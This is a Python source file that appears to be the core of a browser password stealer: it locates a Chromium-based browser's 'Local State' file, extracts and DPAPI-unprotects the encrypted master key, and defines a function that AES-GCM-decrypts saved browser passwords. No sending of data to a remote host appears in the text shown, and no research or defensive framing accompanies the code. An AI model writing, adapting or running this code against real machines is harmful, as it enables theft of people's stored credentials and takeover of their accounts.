import os
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import json
import os
import base64

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

def get_master_key(path: str):
    try:
        if not os.path.exists(path):
            return
        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return
        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except FileNotFoundError:
        print(f"Local State file not found in {path}.")


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    if (len(buff) == 0):
        return ""
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    try:
        decrypted_pass = decrypted_pass[:-16].decode(errors='ignore')
    except UnicodeDecodeError:
        decrypted_pass = "Error decoding the password"
    return decrypted_pass